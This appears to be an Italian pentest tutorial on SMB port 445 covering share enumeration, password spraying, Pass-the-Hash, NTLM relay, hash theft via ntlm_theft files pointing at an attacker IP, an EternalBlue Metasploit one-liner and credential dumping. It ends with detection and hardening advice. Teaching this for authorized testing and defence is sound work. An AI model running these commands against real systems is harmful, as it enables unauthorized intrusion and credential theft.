---
title: 'Porta 445 SMB: Enumerazione e Attacchi in un Pentest'
slug: smb
description: 'Porta 445 SMB in server Windows: enumerazione delle share, exploit, NTLM relay, Pass-the-Hash, esecuzione remota e lateral movement in Active Directory.'
image: /smb-port-445-ethical-hacking-guide.webp
draft: false
date: 2026-02-01T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - SMB
  - Porta 445
  - enumerazione SMB
  - EternalBlue
---

# Porta 445 SMB: cos'è, come enumerarla e come difenderla

**La porta 445 è la porta TCP che Windows usa per SMB (Server Message Block)**: condivisione di file e stampanti, named pipe, RPC e autenticazione (NTLM o Kerberos) su un'unica connessione, senza passare dal vecchio NetBIOS della [porta 139](https://hackita.it/articoli/porta-139-netbios-session/). In una rete Active Directory è il canale per share, sessioni, esecuzione remota e movimento laterale: per questo, in un pentest interno, è quasi sempre il primo servizio che guardi.

La porta aperta non è una vulnerabilità. Il rischio dipende da versione SMB, signing, autenticazione, permessi delle share e dalle protezioni di rete. Questa guida è per lab, CTF (Hack The Box, OSCP, OSEP) e pentest autorizzati, e insegna a **verificare** ogni condizione prima di trarre conclusioni.

**Risposta rapida:** scopri chi ha la 445 aperta, controlla dialect e signing, prova l'accesso anonimo, enumera share e utenti con credenziali valide, poi valuta relay, esecuzione remota e vulnerabilità legacy. Ogni passo ha un risultato da interpretare, non solo un comando da lanciare.

## SMB in Una Riga

`445/TCP` = file sharing + named pipe + RPC + autenticazione NTLM/Kerberos. Superficie d'attacco: share, sessioni, credenziali, signing, versioni legacy.

## Le Porte Legate a SMB

| Porta                                                              | Servizio               | Note                                    |
| ------------------------------------------------------------------ | ---------------------- | --------------------------------------- |
| 445/TCP                                                            | SMB diretto su TCP     | Quella moderna: parti sempre da qui     |
| [139/TCP](https://hackita.it/articoli/porta-139-netbios-session/)  | SMB su NetBIOS Session | Legacy, presente per compatibilità      |
| [137/UDP](https://hackita.it/articoli/porta-137-netbios/)          | NetBIOS Name Service   | Risoluzione nomi, utile per `nbtscan`   |
| [138/UDP](https://hackita.it/articoli/porta-138-netbios-datagram/) | NetBIOS Datagram       | Raro nelle reti moderne                 |
| [135/TCP](https://hackita.it/articoli/porta-135-rpc/)              | RPC Endpoint Mapper    | Usata da WMI/DCOM, spesso insieme a SMB |

Non ogni sistema Windows espone la 445: dipendono servizio, ruolo, regole firewall e rete. Per un approfondimento sul protocollo vedi anche [SMB](https://hackita.it/articoli/smb/).

## Anatomia di una Sessione SMB

1. **TCP handshake** su 445
2. **Negotiate**: client e server scelgono il dialect (2.0.2, 2.1, 3.0, 3.0.2, 3.1.1; SMBv1 se ancora attivo)
3. **Session Setup**: autenticazione [NTLM](https://hackita.it/articoli/ntlm/) o [Kerberos](https://hackita.it/articoli/kerberos/)
4. **Tree Connect**: connessione a una share (`\\host\share`)
5. **Operazioni**: lettura, scrittura, named pipe via `IPC$` (da cui passa l'RPC per utenti, gruppi, policy)

| Dialect         | Note                                                                |
| --------------- | ------------------------------------------------------------------- |
| SMBv1           | Deprecato. Target di EternalBlue (MS17-010) se non patchato         |
| SMB 2.x         | Windows Vista/7 e successivi                                        |
| SMB 3.0 / 3.0.2 | Encryption, multichannel                                            |
| SMB 3.1.1       | Pre-authentication integrity, Windows 10 / Server 2016 e successivi |

Share di default: `ADMIN$`, `C$` (accessibili solo ad admin), `IPC$` (named pipe e RPC), `NETLOGON` e `SYSVOL` (sui domain controller), `print$` (driver di stampa).

## Fase 1: Rilevamento e Fingerprint

```bash
# Chi ha la 445 aperta
nmap -p 445 --open -Pn 10.10.10.0/24 -oG smb_hosts.txt

# Host, OS, dominio, dialect e signing
nmap -p 445 -Pn --script smb-os-discovery,smb-protocols,smb2-security-mode 10.10.10.10

# Panoramica di rete con NetExec
nxc smb 10.10.10.0/24
```

Output di esempio di NetExec (illustrativo):

```text
SMB   10.10.10.10  445  DC01      [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
SMB   10.10.10.20  445  WS-DEV01  [*] Windows 11 Build 22631 x64 (name:WS-DEV01) (domain:corp.local) (signing:False) (SMBv1:False)
SMB   10.10.10.50  445  SRV-FILE  [*] Windows Server 2019 Build 17763 x64 (name:SRV-FILE) (domain:corp.local) (signing:False) (SMBv1:False)
```

Cosa leggere: nome e dominio, OS e build, `signing`, `SMBv1`. È già una mappa: DC con signing richiesto, altri host da controllare. Per i dettagli sul tool: [NetExec](https://hackita.it/articoli/netexec/). Se trovi `crackmapexec` in vecchi lab o write-up, è il predecessore: [CrackMapExec](https://hackita.it/articoli/crackmapexec/). I comandi di questa guida usano `nxc`.

Per risolvere i nomi NetBIOS di una subnet: [nbtscan](https://hackita.it/articoli/nbtscan/).

## Fase 2: Dialect e Signing

```bash
nmap -p 445 -Pn --script smb-protocols,smb2-security-mode 10.10.10.20
```

```text
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

`smb2-security-mode` controlla il signing sui server SMB2/SMB3. Il vecchio `smb-security-mode` riguarda il modello legacy (SMBv1): non usarlo come controllo principale.

| Risultato                                    | Significato                                             |
| -------------------------------------------- | ------------------------------------------------------- |
| `signing:True` / "required"                  | Il relay SMB verso quell'host non funziona              |
| `signing:False` / "enabled but not required" | Segnale di rischio, **non** prova che un relay riuscirà |
| `SMBv1:True`                                 | Protocollo legacy attivo: controlla le patch (MS17-010) |

Il default dipende da versione e ruolo. I domain controller richiedono normalmente il signing. Windows 11 24H2 (Pro, Enterprise, Education) e Windows Server 2025 hanno default più restrittivi di prima, con differenze tra connessioni in entrata e in uscita. Non generalizzare: **verifica sul sistema effettivo**.

Lista dei target senza signing (utile per il relay):

```bash
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```

## Fase 3: Accesso Anonimo (Null e Guest Session)

Il test cerca di capire cosa si ottiene senza credenziali.

```bash
smbclient -N -L //10.10.10.50
smbmap -H 10.10.10.50 -u '' -p ''
smbmap -H 10.10.10.50 -u guest
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares
rpcclient -U "" -N 10.10.10.50
enum4linux-ng -A 10.10.10.50
```

Strumenti: [smbclient](https://hackita.it/articoli/smbclient/), [smbmap](https://hackita.it/articoli/smbmap/), [rpcclient](https://hackita.it/articoli/rpcclient/), [enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/).

Output di esempio di `smbmap` (illustrativo, sessione anonima):

```text
[+] IP: 10.10.10.50:445  Name: SRV-FILE.corp.local
    Disk        Permissions   Comment
    ----        -----------   -------
    ADMIN$      NO ACCESS     Remote Admin
    C$          NO ACCESS     Default share
    IPC$        READ ONLY     Remote IPC
    Public      READ, WRITE   Public Documents
    IT-Deploy   READ ONLY     IT Deployment Scripts
```

Come interpretarlo:

| Risultato                    | Cosa dimostra                                    | Cosa non dimostra                            |
| ---------------------------- | ------------------------------------------------ | -------------------------------------------- |
| Elenco share anonimo         | Il server consente la sessione senza credenziali | Che i file contengano segreti                |
| `IPC$` leggibile             | Parte dell'RPC può rispondere                    | Che utenti e gruppi siano enumerabili        |
| `Public: READ, WRITE`        | Accesso con **quell'identità**                   | I permessi NTFS reali sui file (vedi Fase 4) |
| `NT_STATUS_ACCESS_DENIED`    | Autenticazione rifiutata o accesso negato        | Che la share non esista                      |
| `NT_STATUS_BAD_NETWORK_NAME` | Quella share non esiste                          |                                              |
| `NT_STATUS_LOGON_FAILURE`    | Credenziali non valide                           |                                              |

Un risultato negativo non prova che non esista nulla: con un'identità valida l'esito può cambiare. Registra sempre **quale identità** ha fatto il test.

## Fase 4: Share, Permessi e File Sensibili

Una share ha tre livelli di permesso da non confondere: permessi della **share**, permessi **NTFS** su file e cartelle, e permessi **effettivi** dell'identità che usi. `READ, WRITE` in `smbmap` indica il test fatto con quell'utente; non dice tutto il resto.

```bash
# Elenco share con credenziali
smbmap -H 10.10.10.50 -u jsmith -p 'Password1' -d corp.local
nxc smb 10.10.10.50 -u jsmith -p 'Password1' --shares

# Contenuto ricorsivo di una share
smbmap -H 10.10.10.50 -u jsmith -p 'Password1' -r IT-Deploy --depth 3

# Shell interattiva e download
smbclient //10.10.10.50/IT-Deploy -U 'corp.local\jsmith%Password1'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Montare la share su Linux
sudo mount -t cifs //10.10.10.50/IT-Deploy /mnt/share -o username=jsmith,domain=corp.local

# Spider con NetExec
nxc smb 10.10.10.50 -u jsmith -p 'Password1' -M spider_plus
```

Per automatizzare la ricerca nelle share esiste anche Snaffler (Windows). Cosa cercare:

| File / posizione                           | Perché                                                               |
| ------------------------------------------ | -------------------------------------------------------------------- |
| `*.config`, `web.config`, `*.ini`, `*.xml` | Connection string, service account                                   |
| `*.ps1`, `*.bat`, `*.vbs`                  | Script di deployment con credenziali                                 |
| `Registry.xml`, `Unattend.xml`             | Autologon, installazioni automatiche                                 |
| `SYSVOL\...\Groups.xml`                    | GPP con `cpassword`: la chiave è pubblica, la password è decifrabile |
| `*.kdbx`, backup, dump                     | Archivi di credenziali o dati                                        |

```bash
# Esempio: GPP cpassword in SYSVOL
smbclient //10.10.10.10/SYSVOL -U 'corp.local\jsmith%Password1' -c "recurse ON; prompt OFF; mget *"
grep -ri "cpassword" corp.local/
gpp-decrypt '<valore_cpassword>'
```

Il vecchio problema GPP (MS14-025) è stato corretto: nelle reti aggiornate di solito non trovi più nuovi `cpassword`, ma file storici restano comuni nei lab.

## Fase 5: Utenti, Gruppi e Policy

```bash
rpcclient -U 'corp.local\jsmith%Password1' 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> querydispinfo
rpcclient $> enumdomgroups
rpcclient $> getdompwinfo

nxc smb 10.10.10.10 -u jsmith -p 'Password1' --users
nxc smb 10.10.10.10 -u jsmith -p 'Password1' --groups
nxc smb 10.10.10.10 -u jsmith -p 'Password1' --pass-pol
nxc smb 10.10.10.10 -u jsmith -p 'Password1' --rid-brute

lookupsid.py corp.local/jsmith:'Password1'@10.10.10.10
```

[lookupsid](https://hackita.it/articoli/lookupsid/) e `--rid-brute` ricostruiscono gli utenti dai RID (500, 501, 1000+) anche quando l'enumerazione diretta è limitata. La policy (`--pass-pol`, `getdompwinfo`) ti dà soglia di lockout e finestra di reset: **leggila prima** di qualsiasi spray.

Output di esempio (illustrativo):

```text
[+] Password Policy:
    Minimum length: 8
    Lockout threshold: 5
    Lockout observation window: 30 minutes
```

Un'appartenenza a un gruppo privilegiato è un'ipotesi di lavoro, non una conclusione. Esempio: `Backup Operators` ha `SeBackupPrivilege`, che permette di leggere file ignorando le ACL (per esempio copiare hive del registro). **Non equivale a DCSync**, che richiede i diritti di replica AD (*Replicating Directory Changes* e *Replicating Directory Changes All*, e in alcuni casi *In Filtered Set*). Sono percorsi diversi: vedi [DCSync](https://hackita.it/articoli/dcsync/) e [BloodHound](https://hackita.it/articoli/bloodhound/) per mappare i diritti reali.

## Fase 6: Autenticazione, Spray e Pass-the-Hash

### Password spraying

```bash
nxc smb 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success
```

Una password per ciclo, sotto la soglia di lockout letta nella Fase 5, poi aspetta la finestra di osservazione. Approfondimento: [Password Spraying](https://hackita.it/articoli/password-spraying/). Per il brute force su un singolo utente: [Hydra](https://hackita.it/articoli/hydra/).

### Pass-the-Hash

Con un hash **NT** (32 caratteri) valido puoi autenticarti senza la password. `<NT_HASH>` è un segnaposto: non usare hash di esempio (l'hash `31d6cfe0d16ae931b73c59d7e0c089c0` è quello di una password **vuota**).

```bash
# NetExec: solo l'hash NT
nxc smb 10.10.10.50 -u administrator -H <NT_HASH> --shares

# Impacket: formato LM:NT, LM può essere vuoto
impacket-psexec corp.local/administrator@10.10.10.50 -hashes :<NT_HASH>
```

```text
SMB  10.10.10.50  445  SRV-FILE  [+] corp.local\administrator:<NT_HASH> (Pwn3d!)
```

`Pwn3d!` indica che l'identità ha diritti amministrativi locali su quell'host. Se vedi `STATUS_LOGON_FAILURE`, l'hash può essere sbagliato o l'account bloccato; un hash NetNTLMv2 catturato con Responder **non** è un hash NT e non si usa per PtH (si cracka o si rilancia). Guida completa: [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/).

### Kerberos

```bash
smbclient --kerberos //ws01.corp.local/C$
nxc smb 10.10.10.50 -u jsmith -p 'Password1' -k
```

Con Kerberos usa il FQDN, non l'IP.

## Fase 7: Esecuzione Remota via SMB

Servono credenziali (o hash) con diritti amministrativi sul target. Ogni metodo ha requisiti e tracce diverse.

| Tool                                              | Come funziona                                          | Note                                                          |
| ------------------------------------------------- | ------------------------------------------------------ | ------------------------------------------------------------- |
| [psexec](https://hackita.it/articoli/psexec/)     | Carica un binario su `ADMIN$`, crea un servizio        | Shell SYSTEM; evento di nuovo servizio, spesso bloccato da AV |
| [smbexec](https://hackita.it/articoli/smbexec/)   | Servizio che esegue comandi e scrive l'output su share | Meno binari su disco di psexec                                |
| [wmiexec](https://hackita.it/articoli/wmiexec/)   | WMI/DCOM per eseguire comandi                          | Usa la 135 e porte RPC dinamiche oltre alla 445               |
| [atexec](https://hackita.it/articoli/atexec/)     | Task Scheduler                                         | Un comando alla volta                                         |
| [dcomexec](https://hackita.it/articoli/dcomexec/) | Oggetti DCOM                                           | Alternativa a WMI                                             |

```bash
impacket-psexec corp.local/administrator:'Password1'@10.10.10.50
impacket-wmiexec corp.local/administrator:'Password1'@10.10.10.50
nxc smb 10.10.10.50 -u administrator -p 'Password1' -x whoami
nxc smb 10.10.10.50 -u administrator -p 'Password1' -X '$PSVersionTable'
```

```text
[-] SMB SessionError: STATUS_ACCESS_DENIED
```

`ACCESS_DENIED` su `ADMIN$` significa di solito che l'utente non è admin locale sul target. Non esiste un metodo "invisibile": nessun file su disco non equivale a nessuna telemetria (vedi la sezione Detection). Quadro generale: [Impacket](https://hackita.it/articoli/impacket/), [Lateral Movement](https://hackita.it/articoli/lateral-movement/).

## Fase 8: NTLM Relay e Furto di Hash

Il relay inoltra un'autenticazione NTLM in transito verso un altro servizio. Il solo `signing:False` **non basta**. Servono tutte queste condizioni:

* Un'autenticazione NTLM effettivamente catturabile (Responder, coercizione, file malevolo su una share)
* Un target che accetta NTLM e non richiede signing (SMB) o protezioni equivalenti (LDAP signing, channel binding, EPA per HTTP/LDAPS)
* L'identità rilanciata deve avere i privilegi necessari: un machine account (`DC01$`) non è admin locale su un file server per default
* Il relay verso lo stesso host di origine è bloccato

```bash
# 1. Target senza signing
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# 2. Responder con SMB e HTTP spenti (in Responder.conf: SMB = Off, HTTP = Off)
sudo responder -I tun0

# 3. Relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

```text
[*] SMBD-Thread-5: Received connection from 10.10.10.20, attacking target smb://10.10.10.50
[*] Authenticating against smb://10.10.10.50 as CORP/JSMITH SUCCEED
[*] Dumping local SAM hashes
```

```text
[-] Signing is required for 10.10.10.10, skipping
```

Cosa NON confondere: `--delegate-access` è una modalità legata al relay verso **LDAP/LDAPS** (delega RBCD con un computer account), non un effetto della lista di host SMB. Un relay LDAP dipende da LDAP signing e channel binding. Guida: [NTLM Relay](https://hackita.it/articoli/ntlm-relay/), [Responder](https://hackita.it/articoli/responder/), [ESC8 (relay verso ADCS)](https://hackita.it/articoli/esc8-adcs/).

**Furto di hash con file su share scrivibili.** Se una share è scrivibile, un file con un percorso UNC (`.scf`, `.lnk`, `.url`, o generato da `ntlm_theft`) fa autenticare chi lo apre verso il tuo host. Con Responder catturi un hash NetNTLMv2 da crackare con [Hashcat](https://hackita.it/articoli/hashcat/) (`-m 5600`) o da rilanciare. Funziona solo se qualcuno apre quella cartella e l'host può raggiungere il tuo listener.

### Lab: Furto di Hash con ntlm\_theft e Responder

Scenario da lab (Hack The Box o rete di test): hai accesso in scrittura a una share e un utente, o un job automatico, la apre. Vuoi catturare il suo hash NetNTLMv2.

**1. Responder in ascolto** sulla tua interfaccia VPN:

```bash
sudo responder -I tun0 -v
```

**2. Genera i file con `ntlm_theft`**, puntando al tuo IP:

```bash
pip3 install xlsxwriter
python3 ntlm_theft.py -g modern -s 10.10.14.5 -f Report_Q4
```

* `-g modern` genera i formati che funzionano su Windows recenti (salta `.scf`, `autorun.inf`, `desktop.ini`, Zoom). `-g all` li crea tutti; con `-g xlsx` ne scegli uno solo.
* `-s` è l'IP del tuo listener, `-f` il nome base dei file.

Ottieni una cartella `Report_Q4/` con `.url`, `.lnk`, `.docx`, `.xlsx`, `.pdf`, `.htm` e altri.

**3. Carica il file sulla share scrivibile:**

```bash
smbclient //10.10.10.50/Public -U 'corp.local\jsmith%Password1' -c "put Report_Q4/Report_Q4.url"
```

**4. Aspetta che qualcuno lo apra.** Quando la vittima apre la cartella (`.url`, `.lnk`) o il documento (`.docx`, `.xlsx`, `.pdf`), Windows prova ad autenticarsi verso `\\10.10.14.5\...` e Responder cattura l'hash:

```text
[SMB] NTLMv2-SSP Client   : 10.10.10.20
[SMB] NTLMv2-SSP Username : CORP\mrossi
[SMB] NTLMv2-SSP Hash     : mrossi::CORP:1122334455667788:<hash>:<blob>
```

(Output illustrativo.)

**5. Crack offline** dell'hash salvato (cartella `/usr/share/responder/logs/` o `/opt/Responder/logs/`, a seconda dell'installazione):

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

È un hash **NetNTLMv2**: non si usa per Pass-the-Hash, si cracka oppure si rilancia (vedi relay sopra, con SMB/HTTP di Responder spenti).

| Tipo di file                         | Serve                             |
| ------------------------------------ | --------------------------------- |
| `.url`, `.lnk`                       | Che l'utente apra la cartella     |
| `.docx`, `.xlsx`, `.pdf`, `.htm`     | Che l'utente apra il file         |
| `.scf`, `autorun.inf`, `desktop.ini` | Funzionano solo su Windows datati |

Funziona solo se: la share è scrivibile, un utente (o un'attività automatica) apre il file, e la sua macchina raggiunge il tuo IP sulla 445. Se non arriva nulla, controlla VPN, `tun0` e che nessun altro servizio occupi la 445 sul tuo host. Nei lab HTB spesso c'è un bot che simula l'apertura. Attenzione: puliscilo a fine test, i file restano sulla share. Vedi anche [Responder](https://hackita.it/articoli/responder/) e [Hashcat](https://hackita.it/articoli/hashcat/).

**Coercizione.** Tecniche come PetitPotam o PrinterBug forzano un host a autenticarsi verso di te. Alcune sono state mitigate con le patch: verifica sempre stato e versione nel lab.

## Fase 9: SMBv1 e Vulnerabilità Legacy

| Vulnerabilità | Riferimento                                       | Condizione                                                    |
| ------------- | ------------------------------------------------- | ------------------------------------------------------------- |
| EternalBlue   | MS17-010                                          | SMBv1, sistema non patchato                                   |
| MS08-067      | [MS08-067](https://hackita.it/articoli/ms08-067/) | Windows 2000/XP/2003 non patchati                             |
| SMBGhost      | CVE-2020-0796                                     | SMB 3.1.1 con compressione, Windows 10 1903/1909 non patchato |

SMBv1 attivo è un prerequisito rilevante, ma **non basta**: contano patch e sistema reale. Prima rileva, poi (solo nel lab) valuta l'exploit.

```bash
nmap -p 445 -Pn --script smb-vuln-ms17-010 10.10.10.40
```

```text
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
```

```bash
# Check non invasivo in Metasploit, poi l'exploit
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 10.10.10.40; run"
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST tun0; run"
```

Se l'exploit fallisce, prima di cambiare modulo controlla architettura, named pipe disponibili e stato delle patch: un modulo alternativo non è una soluzione universale. Vedi [Metasploit](https://hackita.it/articoli/metasploit/) e [msfconsole](https://hackita.it/articoli/msfconsole/). Se la 445 non è raggiungibile per colpa del firewall, il percorso è un [pivot](https://hackita.it/articoli/pivoting/) da una subnet autorizzata.

## Fase 10: Dopo l'Accesso

Con diritti amministrativi sul target:

```bash
impacket-secretsdump corp.local/administrator:'Password1'@10.10.10.50
nxc smb 10.10.10.50 -u administrator -p 'Password1' --sam
nxc smb 10.10.10.50 -u administrator -p 'Password1' --lsa
```

Approfondimenti: [secretsdump](https://hackita.it/articoli/secretsdump/), [Credential Dumping](https://hackita.it/articoli/credential-dumping/), [Mimikatz](https://hackita.it/articoli/mimikatz/), [Credential Harvesting](https://hackita.it/articoli/credential-harvesting/). Dal lato Active Directory, il quadro è in [Active Directory](https://hackita.it/articoli/active-directory/).

## Porta 445 SMB: TCP o UDP?

**TCP.** SMB sulla 445 usa solo TCP: `445/tcp`, servizio `microsoft-ds`. IANA registra anche `445/udp`, ma SMB non lo usa: in una scansione UDP la 445 risulta di solito chiusa o filtrata.

| Porta | Protocollo | Uso                                                                   |
| ----- | ---------- | --------------------------------------------------------------------- |
| 445   | TCP        | SMB diretto (quello che ti interessa)                                 |
| 139   | TCP        | SMB su NetBIOS Session (legacy)                                       |
| 137   | UDP        | NetBIOS Name Service                                                  |
| 138   | UDP        | NetBIOS Datagram                                                      |
| 443   | UDP        | SMB over QUIC (Windows Server 2025 e Windows 11 recenti, non diffuso) |

```bash
nmap -sS -p 445 10.10.10.10        # TCP: è questa che conta
nmap -sU -p 137,138 10.10.10.10    # UDP: NetBIOS, non SMB
```

Se in un lab la 445 TCP risulta `filtered`, il problema è il firewall, non il protocollo: non perdere tempo con la scansione UDP.

## SMB, WinRM e RDP a Confronto

| Aspetto            | SMB (445/TCP)                      | [WinRM](https://hackita.it/articoli/porta-5985-winrm/) (5985/5986)        | [RDP](https://hackita.it/articoli/porta-3389-rdp/) (3389) |
| ------------------ | ---------------------------------- | ------------------------------------------------------------------------- | --------------------------------------------------------- |
| Autenticazione     | NTLM, Kerberos                     | NTLM, Kerberos                                                            | NLA (NTLM/Kerberos)                                       |
| Esecuzione comandi | psexec, smbexec, wmiexec (con RPC) | PowerShell remoting, [Evil-WinRM](https://hackita.it/articoli/evilwinrm/) | Sessione grafica                                          |
| Pass-the-Hash      | Sì                                 | Sì                                                                        | Solo con Restricted Admin                                 |
| Quando preferirlo  | Share, file, esecuzione con admin  | Se SMB è filtrato                                                         | Se serve la GUI                                           |

La 445 è centrale in molti percorsi, ma non in tutti: WinRM, RDP e WMI usano altre porte, e il relay NTLM può colpire anche LDAP o HTTP.

## Detection e Telemetria

Gli eventi esistono solo se auditing e raccolta sono configurati (Security log, Sysmon, EDR).

| Comportamento            | Cosa osservare                                                                      |
| ------------------------ | ----------------------------------------------------------------------------------- |
| Accessi di rete          | 4624 (Logon Type 3), 4625 (fallimenti), 4776 (validazione NTLM sul DC)              |
| Accesso alle share       | 5140, 5145 (richiedono audit file share), volume di file letti                      |
| Installazione di servizi | 7045 (System), 4697 (Security): psexec, smbexec                                     |
| Processi                 | 4688, Sysmon 1: `cmd.exe`/`powershell.exe` figli di `services.exe` o `wmiprvse.exe` |
| Connessioni di rete      | Sysmon 3: connessioni verso 445 da processi insoliti                                |
| Spray                    | Molti 4625/4776 da una sola sorgente su molti utenti                                |
| Modifiche AD             | Cambi a gruppi, ACL e permessi di replica                                           |

Un metodo "senza file su disco" può comunque generare processi, log ed eventi correlabili. Per l'analisi del traffico: [Wireshark](https://hackita.it/articoli/wireshark/), [tcpdump](https://hackita.it/articoli/tcpdump/).

## Hardening

Verifica lo stato reale prima di cambiare:

```powershell
Get-SmbServerConfiguration | Select RequireSecuritySignature, EnableSMB1Protocol, EncryptData, RejectUnencryptedAccess
Get-SmbShare
Get-SmbShareAccess -Name "IT-Deploy"
Get-SmbConnection
```

* **Signing richiesto** via GPO: *Microsoft network server: Digitally sign communications (always)* e lo stesso lato client
* **Disabilita SMBv1**: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`
* **Limita l'accesso anonimo**: restrizione di sessioni null, `RestrictAnonymous`, nessun accesso guest
* **Share a minimo privilegio**: niente `Everyone`, controlla sia permessi share sia NTFS
* **Firewall**: blocca la 445 ai confini di rete e tra segmenti che non ne hanno bisogno ([firewall](https://hackita.it/articoli/firewall/))
* **Protezioni anti-relay**: LDAP signing e channel binding sui DC, EPA sui servizi HTTP, ridurre o disabilitare NTLM dove possibile, Kerberos al suo posto
* **Password amministrative locali uniche** ([LAPS](https://hackita.it/articoli/getlapspassword/)) per limitare il riuso dell'hash tra host
* **SMB encryption** per le share con dati sensibili

## Troubleshooting

| Sintomo                                         | Causa probabile                                | Cosa controllare                                     |
| ----------------------------------------------- | ---------------------------------------------- | ---------------------------------------------------- |
| `Connection refused` / filtered su 445          | Firewall o servizio assente                    | `nmap -Pn -p 445`, regole di rete, pivot             |
| `STATUS_ACCESS_DENIED` su `ADMIN$`              | Utente non admin locale                        | Gruppi sul target, `--local-auth` per account locali |
| `STATUS_LOGON_FAILURE` con hash                 | Hash non NT, utente o dominio errato           | Formato (`:<NT_HASH>`), dominio, blocco account      |
| `NT_STATUS_BAD_NETWORK_NAME`                    | Share inesistente                              | Elenco share                                         |
| Il relay fallisce con `Signing is required`     | Target con signing richiesto                   | Usa solo target in `--gen-relay-list`                |
| Relay avviato ma nessuna connessione            | Nessuna autenticazione in transito             | Responder/coercizione, porte SMB/HTTP libere         |
| `STATUS_PASSWORD_MUST_CHANGE`, account bloccato | Policy di dominio                              | Policy e lockout (Fase 5)                            |
| psexec si connette ma niente shell              | AV/EDR blocca il servizio                      | Prova un altro metodo, controlla i log               |
| Kerberos fallisce                               | IP al posto del FQDN, orario non sincronizzato | Nome DNS, `ntpdate`/skew di orario                   |

## Checklist Operativa

```text
[ ] 445 raggiungibile e host identificato (nmap, nxc)
[ ] Dialect e signing verificati (smb-protocols, smb2-security-mode)
[ ] SMBv1 e vulnerabilità legacy rilevate, non solo supposte
[ ] Accesso anonimo e guest testato, identità registrata
[ ] Share, permessi share e NTFS distinti
[ ] Utenti, gruppi e policy di lockout letti prima di ogni spray
[ ] Credenziali trovate nelle share verificate in modo mirato
[ ] Relay: prerequisiti (NTLM catturabile, signing, privilegi) controllati
[ ] Output reali separati da quelli illustrativi nel report
[ ] Detection e hardening documentati
```

## FAQ

**A cosa serve la porta 445?**
È la porta TCP usata da SMB per file e stampanti, named pipe, RPC e autenticazione su Windows.

**Qual è la differenza tra porta 445 e 139?**
La 445 è SMB direttamente su TCP; la 139 usa NetBIOS Session Service ed è legacy.

**Come verifico se il signing SMB è richiesto?**
`nmap -p 445 --script smb2-security-mode <target>` oppure `nxc smb <target>` e leggi il campo `signing`.

**EternalBlue funziona ancora?**
Solo su sistemi con SMBv1 e senza patch MS17-010: oggi quasi esclusivamente nei lab e nelle macchine CTF.

**Signing disabilitato significa NTLM relay riuscito?**
No: servono anche un'autenticazione NTLM in transito e privilegi sufficienti sul target.

**È legale scansionare la porta 445?**
Solo su sistemi tuoi, con autorizzazione scritta o in lab dedicati.

*Riferimenti: Microsoft \[MS-SMB2] (specifica del protocollo SMB 2/3) e documentazione Nmap NSE per `smb2-security-mode`. Verifica sempre opzioni e output sulla versione dei tool che usi.*
